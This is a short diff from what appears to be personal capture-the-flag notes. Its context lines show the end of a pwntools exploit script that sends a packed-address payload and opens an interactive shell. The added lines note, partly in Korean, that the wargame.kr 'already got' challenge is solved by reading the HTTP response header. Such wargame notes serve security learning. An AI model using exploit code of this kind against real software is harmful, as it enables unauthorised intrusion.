@@ -15,3 +15,7 @@ payload += p64(0x4012bc)
 p.send(payload)
 
 p.interactive()
+
+## [War Game] [[wargame.kr] already got]
+
+Just HTTP Response 헤더 확인 > Flag 캐치
